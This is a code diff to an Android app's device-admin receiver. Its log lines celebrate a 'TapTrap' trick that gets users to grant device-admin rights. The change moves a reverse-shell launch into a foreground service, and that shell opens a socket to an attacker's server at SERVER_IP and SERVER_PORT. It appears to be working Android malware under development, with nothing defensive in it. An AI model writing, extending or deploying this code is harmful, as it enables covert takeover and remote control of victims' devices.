@@ -25,7 +25,17 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         // 🔴 TAPTRAP SUCCEEDED!
         Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
         Log.d(TAG, "connect to server ");
-        launchReverseShell(context);
+
+
+        // START THE SERVICE instead of calling launchReverseShell directly
+        Intent serviceIntent = new Intent(context, ShellService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(serviceIntent);
+        } else {
+            context.startService(serviceIntent);
+        }
+
+//        launchReverseShell(context);
 
 //        try {
 //            Thread.sleep(5000);
@@ -48,7 +58,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
     }
 
     // Reverse Shell Code
-    private void launchReverseShell(Context context) {
+    public void launchReverseShell(Context context) {
         new Thread(() -> {
             try {
                 Socket socket = new Socket(SERVER_IP, SERVER_PORT);
